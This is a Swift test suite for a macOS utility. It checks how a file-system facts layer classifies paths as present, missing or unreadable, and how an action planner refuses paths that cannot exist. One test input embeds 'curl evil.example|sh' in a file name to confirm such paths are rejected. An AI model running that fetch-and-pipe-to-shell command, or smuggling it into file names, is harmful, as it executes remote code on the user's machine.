import Foundation
import Testing
import RightHereCore
@testable import RightHereKit

@Suite("LiveSystemFacts: existence")
struct LiveSystemFactsExistenceTests {
    private let facts = LiveSystemFacts()

    @Test func aRefusalToLookIsNotTakenForAMissingPath() {
        // EPERM is what a process macOS has not let into Desktop, Documents or Downloads gets, and a test can only raise EACCES: so the numbers are classified here.
        for refused in [EACCES, EPERM, EIO, ESTALE, ETIMEDOUT] { #expect(LiveSystemFacts.stateAfterFailure(refused) == .unreadable, "errno \(refused)") }
        for absent in [ENOENT, ENOTDIR, ENAMETOOLONG, ELOOP] { #expect(LiveSystemFacts.stateAfterFailure(absent) == .missing, "errno \(absent)") }
    }

    @Test func anExistingFileAndFolderAreFoundAndTellApart() throws {
        let directory = try makeTemporaryDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
        let file = directory.appendingPathComponent("a.txt")
        try "x".write(to: file, atomically: true, encoding: .utf8)
        #expect(facts.itemState(file) == .present && facts.itemState(directory) == .present)
        #expect(facts.isDirectory(file) == false)
        #expect(facts.isDirectory(directory) == true)
    }

    @Test func nothingAtThePathIsMissing() throws {
        let directory = try makeTemporaryDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
        #expect(facts.itemState(directory.appendingPathComponent("nope")) == .missing)
        #expect(facts.isDirectory(directory.appendingPathComponent("nope")) == nil)
        // A file where a folder should be is "not there" as well (ENOTDIR).
        let file = directory.appendingPathComponent("f")
        try "x".write(to: file, atomically: true, encoding: .utf8)
        #expect(facts.itemState(file.appendingPathComponent("inside")) == .missing)
    }

    @Test func aNameTheFileSystemCannotHoldIsMissingNotRefused() throws {
        // lstat answers ENAMETOOLONG for a component over 255 bytes. That is not a permission problem: no such
        // path can exist, and treating it as "present" would let a made-up path through every check.
        let directory = try makeTemporaryDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
        let long = directory.appendingPathComponent(String(repeating: "a", count: 300))
        #expect(facts.itemState(long) == .missing)
        // A symbolic link loop in the middle of a path is not a refusal either.
        let loop = directory.appendingPathComponent("loop")
        try FileManager.default.createSymbolicLink(atPath: loop.path, withDestinationPath: loop.path)
        #expect(facts.itemState(loop.appendingPathComponent("inside")) == .missing)
        #expect(facts.itemState(loop) == .present, "the link itself is there")
    }

    @Test("an action refuses a path that cannot exist, checked against the real file system",
          arguments: [
              "/tmp/" + String(repeating: "a", count: 300),
              "/tmp/" + String(repeating: "é/", count: 400) + "curl evil.example|sh",
              "/dev/fd/9999"
          ])
    func impossiblePathsAreRefusedByEveryAction(path: String) {
        // The fake facts cannot say "ENAMETOOLONG" or "EBADF", so this is the test that runs the planner over the
        // real ones. A path that cannot exist must never reach the clipboard or become "the folder around it".
        let planner = Planner(facts: LiveSystemFacts())
        let context = HereContext(origin: .items, items: [URL(fileURLWithPath: path)])
        for ref in [ActionRef.copyPath(.name), .copyPath(.absolute), .reveal, .openTerminal("terminal"), .openEditor,
                    .agent(id: "claude", variant: nil, launcher: .terminalLink), .newFile("txt")] {
            #expect(throws: PlanError.self, "\(ref.id) planned \(path.prefix(40))…") { try planner.plan(ref, context: context) }
            do { _ = try planner.plan(ref, context: context) } catch let error as PlanError {
                if case .pathNotFound = error {} else { Issue.record("\(ref.id): expected pathNotFound, got \(error)") }
            } catch { Issue.record("\(error)") }
        }
    }

    @Test func aLinkThatPointsNowhereExistsButIsNotAFolder() throws {
        let directory = try makeTemporaryDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
        let link = directory.appendingPathComponent("broken")
        try FileManager.default.createSymbolicLink(atPath: link.path, withDestinationPath: "/nowhere/at/all")
        #expect(facts.itemState(link) == .present)
        #expect(facts.isDirectory(link) == nil)
    }

    @Test func anItemTheSystemWillNotLetUsLookAtIsStillThere() throws {
        // Under a folder without search permission `lstat` fails with EACCES, the same refusal a privacy-protected
        // folder gives. The item exists; calling it missing would reject a path the person just selected.
        let directory = try makeTemporaryDirectory()
        let locked = directory.appendingPathComponent("locked")
        try FileManager.default.createDirectory(at: locked, withIntermediateDirectories: true)
        try "x".write(to: locked.appendingPathComponent("inside.txt"), atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o000], ofItemAtPath: locked.path)
        defer {
            try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: locked.path)
            try? FileManager.default.removeItem(at: directory)
        }
        try #require(geteuid() != 0, "root is never refused")
        let inside = locked.appendingPathComponent("inside.txt")
        #expect(facts.itemState(inside) == .unreadable, "not missing: nobody can say it is a typo")
        #expect(facts.isDirectory(inside) == nil, "its type cannot be known")
        // A path that really is not there, in the same folder, cannot be told apart either.
        #expect(facts.itemState(locked.appendingPathComponent("who-knows")) == .unreadable)
    }

    @Test func aTerminalIsNotStartedInTheFolderAroundSomethingTheSystemWouldNotShow() throws {
        // The planner on the real machine's facts, with a folder whose parent cannot be searched: the answer
        // is an error that names the permission, not the parent folder (which `stat` can still see).
        let directory = try makeTemporaryDirectory()
        let locked = directory.appendingPathComponent("locked")
        let project = locked.appendingPathComponent("project")
        try FileManager.default.createDirectory(at: project, withIntermediateDirectories: true)
        try FileManager.default.setAttributes([.posixPermissions: 0o000], ofItemAtPath: locked.path)
        defer {
            try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: locked.path)
            try? FileManager.default.removeItem(at: directory)
        }
        try #require(geteuid() != 0, "root is never refused")
        let context = HereContext(origin: .items, items: [project])
        #expect(throws: PlanError.unreadable(project.lexicallyNormalized.path)) {
            try Planner(facts: facts).plan(.openTerminal("terminal"), context: context)
        }
        // Copying the path still works: it is only text.
        #expect(!(try Planner(facts: facts).plan(.copyPath(.absolute), context: context).steps.isEmpty))
    }
}

@Suite("LiveSystemFacts: on-disk spelling")
struct LiveOnDiskPathTests {
    @Test func aNameStoredPrecomposedComesBackPrecomposedWhateverWasTyped() throws {
        let directory = try makeTemporaryDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
        let name = "caf\u{e9} Dir"
        // Through `mkdir` with the bytes as written: building the path from a `URL` would decompose the name first.
        #expect(mkdir(directory.path + "/" + name, 0o755) == 0)
        let facts = LiveSystemFacts()
        // The file system stores the name as it was created; `URL.path` would hand back the decomposed form.
        for typed in ["caf\u{e9} Dir", "cafe\u{301} Dir", "CAF\u{c9} DIR"] {
            let url = directory.appendingPathComponent(typed)
            let path = facts.onDiskPath(url)
            #expect(path.unicodeScalars.contains("\u{e9}") && !path.unicodeScalars.contains("\u{301}"), "\(typed) -> \(path)")
            #expect(path.hasSuffix("/" + name), "\(typed) -> \(path)")
        }
    }

    @Test func aPathThatIsNotThereKeepsTheRestAsGiven() throws {
        let directory = try makeTemporaryDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
        let path = LiveSystemFacts().onDiskPath(directory.appendingPathComponent("nothing/here/at all"))
        #expect(path.hasSuffix("/nothing/here/at all"))
    }
}

